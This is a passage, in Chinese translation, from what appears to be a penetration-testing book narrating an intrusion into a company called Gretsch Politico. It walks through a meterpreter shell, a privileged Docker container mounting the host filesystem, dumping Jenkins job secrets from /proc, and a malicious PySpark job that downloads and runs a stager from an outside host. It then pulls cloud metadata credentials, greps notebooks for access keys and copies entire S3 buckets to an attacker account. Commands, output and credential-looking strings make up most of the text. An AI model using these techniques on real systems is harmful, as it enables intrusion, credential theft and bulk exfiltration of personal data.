AccessKeyId: AKIA44ZRK6WSY37NET32,

SecretAccessKey: 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,
```

我们又回到了正轨。我们重新获得了永久凭证。
不过，我们还不能重新启用多区域日志记录。我们需要在最后一次 API 调用后至少等待半小时。这个等待期至关重要，因为事件到达 CloudTrail 可能需要长达 20 分钟。如果过早重新激活全局事件日志，我们的一些操作可能会进入 `trail`，从而进入 S3、Insights、CloudWatch 和其他平台。

## 替代（更差）方法

你可能会想知道为什么我们不直接使用 Lambda 本身来自动化后续的 IAM/CloudTrail 操作。`Lambda` 函数最多只能持续 15 分钟，因此有合理的机会它会过早地重新启用全局事件日志。我们可以在自己的端挂钩另一个 Lambda 以避免这种竞争条件，但对于如此微不足道的事情来说，这工作量太大了。

另外，我们可以选择直接在 Lambda 环境中运行反向 shell，但这远不方便。函数在最小的容器中运行，其中文件系统挂载为只读，除了 `/tmp` 文件夹，该文件夹缺少可执行标志。我们需要手动将反向 shell 加载到内存中作为独立进程，以便它不会被 Lambda 处理程序终止。这一切都是为了什么？一个缺乏最基本实用程序的荒芜之地，AWS 将在 60 分钟内回收它？不值得费力。

### 资源

- 有关 IAM Access Analyzer 的更多信息：https://aws.amazon.com/iam/features/analyze-access/
- 有关 CloudTrail Insights 的更多信息：https://amzn.to/38ROX6E
- AWS S3 通知事件列表：https://amzn.to/2MTqgIo
- 有关集中化日志的更多信息：https://www.loggly.com/ultimate-guide/centralizing-windows-logs/
- 有关查询 Windows 日志的更多信息：https://evotec.xyz/powershell-everything-you-wanted-to-know-about-event-logs/

## 12

## 顶点

![](img/961e81aef23040d0fbe348f58c055860_219_0.png)

当我们摆弄 Lambda 后门时，Gretsch Politico 的某人很友善地触发了嵌套在 `ecr-login.sh` 脚本中的反向 shell。

不止一次，而是多次。大多数会话似乎在大约 30 分钟后超时，因此我们需要迅速高效地评估这个新环境并找到在内部进行横向移动的新方法。我们打开其中一个 `meterpreter` 会话并在远程机器上生成一个 shell：

```
meterpreter > shell

Channel 1 created.

# id

uid=0(root) gid=0(root) groups=0(root)

# hostname

e56951c17be0
```



我们可以看到我们以 `root` ① 身份运行在随机命名的机器 ② 中。是的，我们可能在容器内部。因此，我们运行 `env` 命令以揭示任何注入的秘密，并运行 `mount` 命令以显示主机共享的文件夹和文件。我们随后使用几个查询元数据 API 的命令，请求附加到机器的 IAM 角色（见列表 12-1）。

```text
# env
HOSTNAME=cef681151504
GOPATH=/go
PWD=/go
GOLANG_VERSION=1.13.5
# mount
/dev/mapper/ubuntu--vg-root on /etc/hosts type ext4
(rw,relatime,errors=remount-ro,data=ordered)

① tmpfs on /var/run/docker.sock type tmpfs
(rw,nosuid,noexec,relatime,size=404644k,mode=755)

/dev/mapper/ubuntu--vg-root on /usr/bin/docker type ext4
(rw,relatime,errors=remount-ro,data=ordered)

# apt install -y curl
# curl 169.254.169.254/latest/meta-data/iam/security-credentials/
② ...<title>404 - Not Found</title>...
```

Listing 12-1: `env` 和 `mount` 命令的输出，后跟对元数据 API 的查询

`env` 命令的结果中没有 Kubernetes 变量或编排器名称突出显示。看起来我们被困在了一个独立的容器中，环境中没有任何密码或秘密。底层机器 ② 上甚至没有附加 IAM 角色，只有容器内部挂载的一个狡猾的小 `/var/run/docker.sock` ①，以及一个 Docker 二进制文件。他们真体贴！

我们可以安全地保存可能用于通过 `curl` 直接查询 `/var/run/docker.sock` 的丑陋 JSON，并立即执行 Docker 命令以枚举当前正在运行的容器（见列表 12-2）。

```text
# docker ps
CONTAINER ID   IMAGE
① e56951c17be0  983457354409.dkr.ecr.eu-west-1.amazonaws.com/
                app-abtest:SUP6541-add-feature-network

7f6eb2ec2565   983457354409.dkr.ecr.eu-west-1.amazonaws.com/datavalley:master

8cbc10012935   983457354409.dkr.ecr.eu-west-1.amazonaws.com/libpredict:master
--snip--
```

Listing 12-2: 主机上运行的容器列表

我们发现这台机器上运行着超过 10 个容器，所有容器均从 `983457354409.dkr.ecr.eu-west-1.amazonaws.com` Elastic

容器注册表（ECR）。我们知道账户 ID 为 `983457354409`；在 `mxrads-dl` 的存储桶策略中我们看到了它的授权。我们的猜测是对的：果然是 Gretsch Politico。

在清单 12-2 中找到的所有容器都使用 `master` 标签拉取了，除了一个：`app-abtest` 镜像，它带有奇怪的标签 `SUP6541-add-feature-network`。

我们可能对这台机器上发生的事情有所了解，但在得出结论之前我们仍需要最后一条信息。让我们使用 `docker info` 命令获取更多信息，以显示有关主机的信息：

```
# docker info

Name: jenkins-slave-4

Total Memory: 31.859GiB

Operating System: Ubuntu 16.04.6 LTS

Server:

Containers: 546

Running: 12

--snip--
```

你好，Jenkins，我们的老朋友。现在一切都说得通了。我们可以猜测，我们的 payload 是由我们假设的端到端测试工作负载触发的。此实例中触发的作业可能启动一个容器，该容器使用 `ecr-login.sh` 脚本对 AWS ECR 进行身份验证，然后拉取由 `master` 标签指示的生产容器子集——`datavalley`、`libpredict` 以及其他容器——以及待测试服务的实验性 Docker 镜像：`ab-test`。这就解释了为什么它的标签与其他所有容器不同。

以这种方式暴露 Docker socket 是测试环境中的常见做法，在那里 Docker 并非主要用于其隔离特性，而是用于其打包功能。例如，Crane，一种流行的 Docker 编排工具（https://github.com/michaelsauter/crane/），用于连同其依赖项一起拉取容器。相反，公司可能会将 Crane 打包在容器中，并在需要时在运行时拉取它。

从软件角度来看，这很棒。所有作业都使用相同版本的 Crane 工具，而运行测试的服务器变得无关紧要。然而，从安全角度来看，这合法化了 Docker-in-Docker 技巧的使用（Crane 在其自己的容器内运行容器），这打开了地狱之门，甚至更糟。

## 保持访问

测试作业只能持续一段时间就会被丢弃。让我们通过在我们标记为 `aws-cli` 的新容器上运行自定义 meterpreter，将这种临时访问转变为永久访问：

```
# docker run \
--privileged \
-v /:/hostOS \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /usr/bin/docker:/usr/bin/docker \
-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli
```

我们的新反向 shell 运行在一个特权容器中，该容器挂载了 Docker socket 以及整个主机文件系统到 `/hostOS` 目录中：

```
meterpreter > ls /hostOS

bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt

opt  proc  root  run...
```

开始吧！
正如我们在第 10 章中所看到的，由于其调度能力，Jenkins 可以迅速聚合大量权限。它是技术世界的雷曼兄弟——一个在不受监管的领域中饥饿的实体，受鲁莽的政策制定者鼓励，只差一笔交易就会导致整个经济崩溃。

在此特定情况下，这个比喻性的交易就是 Jenkins 处理环境变量的方式。当作业在 worker 上调度时，可以配置为仅拉取运行所需的一两个秘密，也可以将所有可能的秘密作为环境变量加载。让我们看看 Gretsch Politico 的管理员到底有多懒。

我们筛选出这台机器上由 Jenkins 作业启动的每个进程：

```
shell> ps -ed -o user,pid,cmd | grep "jenkins"

jenkins   1012   /lib/systemd/systemd -user

jenkins   1013   sshd: jenkins@notty

jenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...

jenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/... 

--snip--
```

我们将这些进程的 PID 复制到一个文件中，并逐行迭代以获取其环境变量，这些变量方便地存储在路径 `/proc/$PID/environ` 下：

```
shell> ps -ed -o user,pid,cmd \
| grep "jenkins" \
| awk '{print $2}' \
> listpids.txt

shell> while read p; do \
cat /hostOS/proc/$p/environ >> results.txt; \
done <listpids.txt
```

我们将收获上传到我们的远程服务器并进行一些轻微格式化，然后我们就可以欣赏明文结果（见清单 12-3）。

```
root@Point1:~/# cat results.txt

ghprbPullId = 1068

SANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox

DBEXP_PROD_USER = pg_sql_exp

DBEXP_PROD_PASS = vDoMue8%12N97

METAMARKET_TOKEN = 1#4Xq3_rwn14gJKmkynOHho8p6peSZ2UGIvs...
```



`DASHBOARD_PROD_PASSWORD` = 4hXqulCghprbIU24745

`SPARK_MASTER` = 10.50.12.67

`ActualCommitAuthorEmail` = Elain.ghaber@gretschpolitico.com

`BINTRAY_API_KEY` = 557d459a1e9ac79a1da57$fbee88acdeacsq7S

`GITHUB_API` = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561

`ECR_AWS_ID` = AKIA7ZRK7X1QSZR4H2P

`ECR_AWS_SECRET` = ZO5cOTQQ/5zNoEkRE99pdlInY6anhgz2s30GJ+zgb

--snip--

```
### 清单 12-3：从 Jenkins 机器上运行的作业收集环境变量的结果
```

精彩。我们获得了一个 GitHub API 令牌来探索 GP 的整个代码库，一些数据库密码来收集数据，以及显然的 AWS 访问密钥，这些密钥至少应该可以访问 ECR（AWS 容器注册表）或如果我们幸运的话甚至 EC2。

我们将它们加载到我们的服务器上并盲目地开始探索 AWS 服务：

```
root@Point1:~/# aws ecr describe-repositories \
--region=eu-west-1 \
--profile gretsch1
"repositoryName": "lib-prediction",
"repositoryName": "service-geoloc",
"repositoryName": "cookie-matching",
--snip--
root@Point1:~/# aws ec2 describe-instances --profile gretsch1
An error occurred (UnauthorizedOperation)...
root@Point1:~/# aws s3api list-buckets --profile gretsch1
An error occurred (UnauthorizedOperation)...
root@Point1:~/# aws iam get-user --profile gretsch1
An error occurred (AccessDenied)...
```

我们一旦超出 ECR 范围就会遇到多个错误。在另一个时间、另一个环境中，我们会摆弄容器镜像、搜索硬编码凭据，或篡改生产标签以实现机器上的代码执行——但有一条更 promising 的线索。它被埋在我们从清单 12-3 倾倒的环境数据中，所以让我再次放大它：

```
SPARK_MASTER = 10.50.12.67
```

这里的 SPARK 指的是 Apache Spark，一个开源分析引擎。只关注这个孤零零的 IP 地址而放过 ECR 访问密钥和数据库凭据似乎令人惊讶，但请记住我们最初的目标之一：获取用户资料和数据段。这类数据不会存储在普通的 100GB 数据库中。当充分丰富了每个人的所有可用信息时，并且考虑到 MXR Ads 平台的规模，这些数据资料很容易达到数百甚至数千 TB。

当公司处理如此荒谬的容量时，通常会出现两个问题。他们在哪里存储原始数据？以及如何高效地处理它？

存储原始数据很容易。S3 价格便宜且可靠，这是不言而喻的。然而，处理海量数据则是一个真正的挑战。数据科学家希望以合理的成本建模和预测行为，需要一个分布式系统来处理负载——比如 500 台机器并行工作，每台机器训练多个具有随机超参数的模型，直到找到误差率最低的公式。

但这又引发了额外的问题。他们如何高效地在节点之间划分数据？如果所有机器都需要同一块数据怎么办？他们如何汇总所有结果？最重要的是：他们如何处理故障？因为肯定会发生故障。每 1,000 台机器平均有 5 台，甚至更多，会因各种原因死亡，包括磁盘问题、过热、停电和其他危险事件，即使在顶级数据中心也是如此。他们如何将失败的工作负载重新分配到更健康的节点上？

正是这些问题，Apache Spark 旨在通过其分布式计算框架来解决。如果 Spark 涉及 Gretsch Politico，那么它很可能被用来处理大量数据，这些数据很可能就是我们想要的用户资料——因此我们对在 Jenkins 机器上获取的 IP 地址感兴趣。

入侵 Spark 集群将自动使我们能够访问原始资料数据，了解它经历了什么样的处理，并理解 Gretsch Politico 如何利用这些数据。

然而，截至目前，还没有任何一篇黑客文章可以帮助我们攻破 Spark 集群（同样的观察也可以适用于几乎所有大数据工具：Yarn、Flink、Hadoop、Hive 等）。甚至没有一个 Nmap 脚本来指纹识别这该死的玩意。我们正在未知的海域航行，所以最自然的步骤是首先了解如何与 Spark 集群交互。

## 了解 Spark

Spark 集群本质上由三个主要组件组成：主服务器、worker 机器和 driver。driver 是希望执行计算的客户端；例如分析师的笔记本电脑。主服务器的唯一工作是管理 worker 并根据内存和 CPU 需求分配作业。worker 执行主服务器发送给它们的任何作业。它们与主服务器和 driver 通信。

这三个组件中的每一个都在 Java 虚拟机（JVM）内部运行一个 Spark 进程，甚至分析师的笔记本电脑（driver）也是如此。不过关键在于：Spark 默认情况下是关闭安全性的。

我们不仅仅是在谈论身份验证，你知道吗，即使那样也已经很糟糕了。不，安全整体都被禁用了，包括加密、访问控制，当然还有身份验证。都2021年了，伙计们。你们该好好整顿了。

根据官方文档，要与 Spark 集群通信，需要满足一些网络要求。我们首先需要能够通过 7077 端口访问 master 以调度作业。工作节点机器还需要能够向驱动程序（我们的 Jenkins 节点）发起连接，以请求执行 JAR 文件、报告结果并处理其他调度步骤。

鉴于在列表 12-3 中存在 `SPARK_MASTER` 环境变量，我们有 90% 的把握 Jenkins 运行了一些 Spark 作业，因此可以相当确信所有这些网络条件都已正确配置。但为了安全起见，让我们先确认至少能够访问 Spark master。测试第二个网络要求（工作节点能否连接到驱动程序）的唯一方法是通过提交作业或检查安全组。

我们在 Metasploit 上为 `10.0.0.0/8` 范围添加一条路由，以访问 Spark master IP（`10.50.12.67`）并将其通过当前 meterpreter 会话进行中继：

```
meterpreter > background
msf exploit(multi/handler) > route add 10.0.0.0 255.0.0.0 12
[*] Route added
```

我们随后使用内置的 Metasploit 扫描器探测 7077 端口：

```
msf exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf exploit(scanner/portscan/tcp) > set RHOSTS 10.50.12.67
msf exploit(scanner/portscan/tcp) > set PORTS 7077
msf exploit(scanner/portscan/tcp) > run
[+] 192.168.1.24:      - 192.168.1.24:7077 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
```

没有意外。我们能够与 master 通信。好的，让我们写我们的第一个邪恶 Spark 应用程序！

## 恶意的 Spark

即使 Spark 用 Scala 编写，它也非常好地支持 Python 程序。将 Python 对象转换为 Java 对象需要付出沉重的序列化成本，但我们会在乎吗？我们只想要工作节点上的一个 shell。

Python 甚至有一个 pip 包，可以下载 200MB 的 JAR 文件来快速设置一个可用的 Spark 环境：

```
$ python -m pip install pyspark
```

每个 Spark 应用程序都从相同的样板代码开始，该代码定义了 `SparkContext`，一个负责与 Spark 集群通信的客户端连接器。我们从该设置代码开始我们的应用程序（参见列表 12-4）。

```
from pyspark import SparkContext, SparkConf
# Set up configuration options
conf = SparkConf()
conf = conf.setAppName("Word Count")
# Add the IP of the Spark master
conf = conf.setMaster("spark://10.50.12.67:7077")
```



# Add the IP of the Jenkins worker we are currently on

`conf = conf.set("spark.driver.host", "10.33.57.66")`

# Initialize the Spark context with the necessary info to reach the master

`sc = SparkContext(conf = conf)`

### 列表 12-4：恶意 Spark 应用程序设置代码

此 Spark 上下文实现了创建和操作分布式数据的方法。它允许我们将一个普通的 Python 列表从单体对象转换为可分布到多台机器上的单元集合。这些单元称为分区。每个分区可以保存原始列表的一个、两个或三个元素——由 Spark 认为最优的方式决定。在这里我们定义了由 10 个元素组成的分区集合：

```
partList = sc.parallelize(range(0, 10))
```

`partList.getNumPartitions` 在我的电脑上返回 2，表明它已将原始列表拆分为两个分区。分区 1 可能保存 0、1、2、3 和 4。分区 2 可能保存 5、6、7、8 和 9。

`partList` 现在是一个分区集合。它是一个弹性分布式数据集（RDD），支持许多迭代方法，被称为 Spark 转换，如 `map`、`flatMap`、`reduceByKey`，以及其他将在分布式方式下转换数据的方法。从 MapReduce 操作来看，代码执行似乎希望渺茫，但请耐心听我讲：它最终会很好地联系起来。

> **NOTE** `map` 是一个方法，给定一个列表，(1, 2, 3, 4, . . . n)，和一个方法 F，将返回一个新列表：(F(1), F(2), . . . F(n))。`flatMap` 是一个方法，对于每个元素，可能返回零个、一个或多个对象。因此，对于给定的列表，(1, 2, 3 . . . n)，和一个方法 F，`flatMap` 可能只返回 (F(1)) 或 (F(2), F(3))。F(2) 可以是一个单一元素或另一个列表。

在继续我们的 Spark 应用之前，我将举一个使用 `map` API 的例子，遍历分区的每个元素，将它们馈送给函数 `addTen`，并将结果存储在新的 RDD 中（参见列表 12-5）。

```
def addTen(x):
    return x+10

plusTenList = partList.map(addOne)
```

### 列表 12-5：在 Spark 上使用 map API

现在 `plusTenList` 包含 (10, 11, . . )。这与常规的 Python `map` 或经典循环有何不同？例如，假设我们有两个工作节点和两个分区。Spark 会将元素 0 到 4 发送到机器 #1，将元素 5 到 9 发送到机器 #2。每台机器都会遍历列表，应用函数 `addTen`，并将部分结果返回给驱动程序（我们的 Jenkins 机器），后者再将其合并为最终输出。如果机器 #2 在计算过程中失败，Spark 会自动将相同的工作重新安排到机器 #1 上。

到目前为止，我相信你在想，“太好了。Spark 很棒，但为什么要长篇大论讲 maps 和 RDDs？我们不能直接提交 Python 代码并执行代码吗？”

我希望事情有那么简单。

你看，如果我们只是附加一个经典的 `subprocess.Popen` 调用并执行脚本，我们就会——好吧，你可以自己在列表 12-6 中看到。

```
from pyspark import SparkContext, SparkConf
from subprocess import Popen

conf = SparkConf()
conf = conf.setMaster("spark://10.50.12.67:7077")
conf = conf.set("spark.driver.host", "10.33.57.66")
sc = SparkContext(conf = conf)

partList = sc.parallelize(range(0, 10))
print(Popen(["hostname"], stdout=subprocess.PIPE).stdout.read())

$ python test_app.py
891451c36e6b

$ hostname
891451c36e6b
```

### 列表 12-6：Python 代码在本地执行代码，而不是将其发送到 Spark 集群。

当我们运行测试应用时，我们得到的是我们自己容器的 ID。Python 代码中的 `hostname` 命令在我们的系统上执行。它甚至没有到达 Spark master。发生了什么？

Spark 驱动程序，即 PySpark 在执行代码时初始化的进程，并没有真正将 Python 代码发送到 master。

首先，驱动程序构建一个有向无环图（DAG），它是对 RDD 上执行的所有操作的某种摘要，如加载、`map`、`flatMap`、存储为文件等（参见图 12-1）。

![](img/961e81aef23040d0fbe348f58c055860_228_0.png)

图 12-1：由两个步骤组成的简单 DAG 示例：`parallelize` 和 `map`

然后驱动程序通过发送一些关键属性在 master 上注册工作负载：工作负载的名称、请求的内存、初始执行程序的数量等等。master 确认注册并为传入的作业分配 Spark 工作节点。它与驱动程序共享其详细信息（IP 和端口号），但没有后续操作。直到这一点，没有真正的计算被执行。数据仍然保留在驱动程序侧。

驱动程序继续解析脚本，并在需要时向 DAG 添加步骤，直到它遇到它认为是一个 `action`，即强制 DAG 折叠的 Spark API。此操作可以是显示输出、保存文件、计数元素等调用（你可以在 http://bit.ly/3aW64Dh 找到 Spark 操作的列表）。然后并且只有在那时，DAG 才会被发送到 Spark 工作节点。这些工作节点遵循 DAG 来运行其中包含的转换和操作。

好吧。我们升级代码以添加一个操作（在本例中为 `collect` 方法），该操作将触发应用程序提交到工作节点（参见列表 12-7）。

```
```python
from pyspark import SparkContext, SparkConf
--snip--
partList = sc.parallelize(range(0, 10))
Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()

for a in finallist.collect():
    print(a)
```
```

### 列表 12-7：向恶意 Spark 应用程序添加操作

但我们仍然缺少一个关键部分。工作节点只遵循 DAG，而 DAG 只考虑 RDD 资源。我们需要调用 Python 的 `Popen` 来在工作节点上执行命令，但 `Popen` 既不是像 `map` 这样的 Spark 转换，也不是像 `collect` 这样的操作，因此将被从 DAG 中省略。我们需要作弊，将我们的命令执行包含在 Spark 转换中（例如 `map`），如列表 12-8 所示。

```
```python
from pyspark import SparkContext, SparkConf
from subprocess import Popen
```
```

```
conf = SparkConf()
conf = conf.setAppName("Word Count")
conf = conf.setMaster("spark://10.50.12.67:7077")
conf = conf.set("spark.driver.host", "10.33.57.66")
sc = SparkContext(conf = conf)

partlist = sc.parallelize(range(0, 1))
finalList = partlist.map(
    lambda x: Popen(["hostname"], stdout=subprocess.PIPE).stdout.read()
)

for a in finalList.collect():
    print(a)
```

*清单 12-8：在 Spark 集群上执行代码的完整应用骨架*

与其像在清单 12-5 中那样定义一个新命名函数并通过 `map` 迭代调用它，我们实例化一个以 `lambda` 为前缀的匿名函数，该函数接受一个输入参数（每次迭代的元素）①。当 worker 遍历我们的 RDD 以应用 `map` 转换时，它会遇到我们的 `lambda` 函数，该函数指示它运行 `hostname` 命令。让我们试试看：

```
$ python test_app.py
```



19/12/20 18:48:46 WARN `NativeCodeLoader`: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable

Using Spark's default log4j profile: `org/apache/spark/log4j-defaults.properties`

Setting default log level to "WARN".

To adjust logging level use `sc.setLogLevel(newLevel)`. For SparkR, use `setLogLevel(newLevel)`.

`ip-172-31-29-239`

好了！我们已与主节点取得联系。一次干净利落的命令执行，而且正如所承诺的那样，Spark 在任何时候都没有要求我们提供凭据。

如果重新启动程序，我们的任务可能会被安排到完全不同的另一个 worker 节点上。这是预期的，事实上这正是分布式计算的核心。所有节点都是相同的，并且具有相同的配置（IAM 角色、网络过滤器等），但它们不一定会经历相同的人生。一个 worker 可能会收到一个将数据库凭据泄漏到磁盘的任务，而另一个则负责排序错误信息。

我们可以通过构建具有 n 个分区的 RDD 来强制 Spark 将工作负载分发到 n 台机器上：

```python
partlist = sc.parallelize(range(0, 10), 10)
```

然而，我们无法选择哪些节点会接收负载。是时候在几个 worker 节点上设置一个永久驻留程序了。

## Spark 接管

为了让我们的恶意应用保持运行，我们希望细心地指示 Linux 在其自己的进程组中生成它，以便在作业完成后忽略 JVM 发送的中断信号。我们还希望驱动程序等待几秒钟，直到我们的应用完成与攻击基础设施的稳定连接建立。我们需要在应用中添加以下行：

```python
--snip--

finalist = partlist.map(

    lambda x: subprocess.Popen(

        "wget https://gretsch-spark-eu.s3.amazonaws.com/stager && chmod +x ./stager && ./stager &",

        shell=True,

        preexec_fn=os.setpgrp,

    )

)

finalist.collect()

time.sleep(10)
```

```
$ python reverse_app.py

--snip--
```

在我们的攻击基础设施上，我们打开 Metasploit 并等待应用回拨：

```
[*] https://0.0.0.0:443 handling request from...
[*] https://0.0.0.0:443 handling request from...
msf exploit(multi/handler) > sessions -i 7
[*] Starting interaction with 7...
meterpreter > execute -i -f id
Process 4638 created.
Channel 1 created.
① uid=1000(spark) gid=1000(spark)
groups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)...
```

太棒了！我们成功进入了其中一个 worker。我们以普通 Spark 用户 ① 的身份运行，该用户被信任到足以被列入 sudo 组。这一侧没有抱怨。让我们通过转储环境变量、挂载文件夹、IAM 角色或任何可能有用的其他内容来探索这个新的环境：

```
meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials
```

`spark-standalone.ec2`

```
meterpreter > execute -i -H -f curl -a \
http://169.254.169.254/latest/meta-data/iam/security-credentials/spark-standalone.ec2
```

```
"AccessKeyId" : "ASIA44ZRK6WSS6D36V45",
"SecretAccessKey" : "x2XNGm+p0lF8H/U1cKqNpQGox tLEQTHf1M9KqtxZ",
"Token" : "IQ0Jb3jPZz1uXv2Ej1//////////wEaCWV1Xdlc3QtM..."
```

我们了解到 Spark worker 可以冒充 `spark-standalone.ec2` 角色。与大多数 IAM 角色一样，很难知道其权限的全部范围，但我们可以使用 `mount` 命令获取一些线索：

```
meterpreter > execute -i -H -f mount
--snip--
s3fs on /home/spark/notebooks type fuse.s3fs (rw, nosuid, nodev...)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
--snip--
```

GP 似乎使用 `s3fs` 在 `/home/spark/notebooks` 中本地挂载一个 S3 存储桶。我们从进程列表中挖掘出存储桶的名称（使用带有 `-edf` 参数的 `ps` 命令）：

```
meterpreter > execute -i -H -f ps -a "-edf"
--snip--
spark 14067 1 1 2018 00:51:15 s3fs gretsch-notebooks /home/spark/notebooks -o iam_role
--snip--
```

bingo。映射到 notebooks 文件夹的存储桶名为 `gretsch-notebooks`。让我们加载该角色的凭据并探索此存储桶：

```
root@Point1:~# aws s3api list-objects-v2 \
--bucket-name gretsch-notebooks \
--profile spark
"Key": "jessie/Untitled.ipynb",
"Key": "leslie/Conversion_Model/logistic_reg_point.ipynb",
"Key": "marc/Experiment - Good logistics loss cache.ipynb",
--snip--
```

确实很有趣。该存储桶包含带有 `.ipynb` 扩展名的文件，这是 Python Jupyter notebook 的标志。Jupyter notebook 就像一个基于 Web 的 Python 命令行界面（CLI），专为数据科学家设计，以便轻松设置工作环境并能够绘制图表和分享工作。这些笔记本也可以轻松连接到 Spark 集群以在多台机器上执行工作负载。

数据科学家需要数据来执行计算。大多数人会认为他们需要生产数据才能做出准确的预测。这些数据存在于数据库和 S3 存储桶等位置。因此，这些曾经荒芜的 Jupyter 笔记本随着科学家对更多数据集的需求而迅速演变为一个充满硬编码凭据的温暖池塘也就不足为奇了。

让我们同步整个存储桶并开始寻找一些 AWS 凭据。所有 AWS 访问密钥 ID 都以魔术词 `AKIA` 开头，因此我们 `grep` 该词：

```
root@Point1:~# aws s3 sync s3://gretsch-notebooks ./notebooks
root@Point1:~notebooks# grep -R "AKIA" -4 *
yuka/Conversion model/... awsKeyOpt =
Some("\AKIAASJACEDYAZYWJMGDS\")\n",
yuka/Conversion model/... awsSecretOpt =
Some("\3ceq43SGCmTYkkiZkGrF7dr0Lssxdakymtoi14OSQ\")\n",
--snip--
```

哇！我们收集了数十个个人 AWS 凭据，可能属于 Gretsch Politico 整个数据部门。

让我们也搜索 Spark 中常用的 S3 驱动程序 `s3a` 和 `s3n` 的出现情况，并挖掘一些经常用于加载数据和进行实验的珍贵 S3 存储桶：

```
root@Point1:~notebooks# egrep -R "s3[a|n]://" *
```



① `s3a://gretsch-finance/portfolio/exports/2019/03/report1579446047119.csv`

`s3a://gretsch-hadoop/engine/aft-perf/...`

`s3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...`

`s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...`

--snip--

看看第一个存储桶的名字：`gretsch-finance` ①。这应该很有趣。我们将使用从同一笔记本中检索到的其中一个 AWS 密钥，并卸载 `portfolio/exports/2020` 下的密钥：

```
root@Point1:~# aws s3 sync \
s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1
```

```
root@Point1:~# ls exports_20/
./01/report1548892800915.csv
./02/report1551319200454.csv
./03/report1551578400344.csv
./04/report1553997600119.csv
--snip--
```

让我们采样一个随机文件：

```
root@Point1:~# head ./03/report1551578400344.csv
annual revenue, last contact, initial contact, country, account,
zip code, service purchased, ...
0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...
0.11, 20200103, 20170103, RPU, US, 1101, 0...
```

这确实是一份客户名单！我们不仅获得了当前客户，还获得了潜在客户。详细信息包括他们上次被接触的时间、在哪里、由谁、他们购买的最后服务是什么，以及他们在平台上花费了多少。

> **NOTE** *机器学习算法处理分散的数字效果不佳。因此，通常的做法是将所有数字缩放到相同的范围，例如 0 到 1。如果最高年收入为 €1M，那么报告中的 0.15 相当于 €150K。*

利用这些数据，GP 能够深入了解其客户的消费习惯，并可能建立各种属性之间的隐藏关系，例如会面地点和收入——谁知道呢，可能性无穷无尽。如果你联系一家数据挖掘公司，你应该也预期自己会成为实验的一部分。这很公平。

几乎完成了一个目标。我们也许能找到更详细的信息，但就目前而言，我们已经拥有一个可靠的潜在客户和已验证客户名单。我们可以谷歌每条记录背后的政党，并为我们虚幻的民主而哭泣。

## Finding Raw Data

`gretsch-finance` 存储桶证明是成功的。让我们检查一下其余的存储桶：

```
root@Point1:~# egrep -R "s3[a|n]://" *
s3a://gretsch-hadoop/engine/aft-perf/...
s3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...
s3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...
--snip--
```

配置文件、社交、细分等等。文件名令人喜爱。这很可能就是我们要找的用户数据。请注意，`gretsch-hadoop-us1` 存储桶的名称暗示了区域化分区。有多少个区域，因此有多少个 Hadoop 存储桶？

```
root@Point1:~/# aws s3api list-buckets \
--profile data1 \
--query "Buckets[].Name"| grep Hadoop
gretsch-hadoop-usw1
gretsch-hadoop-euw1
gretsch-hadoop-apse1
```

我们为三个 AWS 区域（北加州、爱尔兰和新加坡）中的每一个找到了一个 Hadoop 存储桶。我们从 `gretsch-hadoop-usw1` 下载了 1,000 个文件，以查看其中包含哪些类型的工件：

```
root@Point1:~/# aws s3api list-objects-v2 \
--profile data1 \
--bucket=gretsch-hadoop-usw1 \
--max-items 1000
"Key": "engine/advertiser-session/2019/06/19/15/08/user_sessions_stats.parquet",
"Key": "engine/advertiser-session/2019/06/19/15/09/user_sessions_stats.parquet",
--snip--
```

我们看到一些扩展名为 `.parquet` 的文件。Parquet 是一种以列式格式存储数据而实现高压缩比的文件格式。它利用了一个准确的观察：在大多数数据库中，一列倾向于存储相同类型的数据（例如整数），而一行更可能存储不同类型的数据。与大多数数据库引擎按行分组数据不同，Parquet 按列分组数据，从而实现了超过 95% 的压缩比。

我们安装必要的工具来解压缩和操作 `.parquet` 文件，然后打开几个随机文件：

```
root@Point1:~/# python -m pip install parquet-cli
```

```
root@Point1:~/# parq 02/user_sessions_stats.parquet -head 100
userid = c9e2b1905962fa0b344301540e615b628b4b2c9f
interest_segment = 4878647678
ts = 1557900000
time_spent = 3
last_ad = 53f407233a5f0fe92bd462af6aa649fa
last_provider = 34
ip.geo.x = 52.31.46.2
--snip--
```

```
root@Point1:~/# parq 03/perf_stats.parquet -head 100
click = 2
referrer = 9735842
deviceUID = 03108db-65f2-4d7c-b884-bb908d111400
--snip--
```

```
root@Point1:~/# parq 03/social_stats.parquet -head 100
social_segment = 61895815510
fb_profile = 3232698
insta_profile = 987615915
pinterest_profile = 57928
--snip--
```

我们获取了用户 ID、社交资料、兴趣细分、广告花费时间、地理位置以及其他令人担忧的追踪用户行为的信息。现在我们的努力有了成果。数据杂乱无章，以专用格式存储且几乎无法解读，但我们最终会弄明白的。

我们可以在机器上配置几 TB 的存储空间，然后完全窃取这三个存储桶。相反，我们只是指示 AWS 将存储桶复制到我们自己的账户，但首先需要稍微调整一下以提高速度：

```
root@Point1:~/# aws configure set default.s3.max_concurrent_requests 1000
root@Point1:~/# aws configure set default.s3.max_queue_size 100000
root@Point1:~/# aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop
```

我们已经获得了三个 Hadoop 存储桶中的所有数据。不过别太兴奋；如果没有深入的探索、业务知识，当然还有计算能力，处理这些数据几乎是不可能的。说实话，我们远远超出了自己的能力范围。

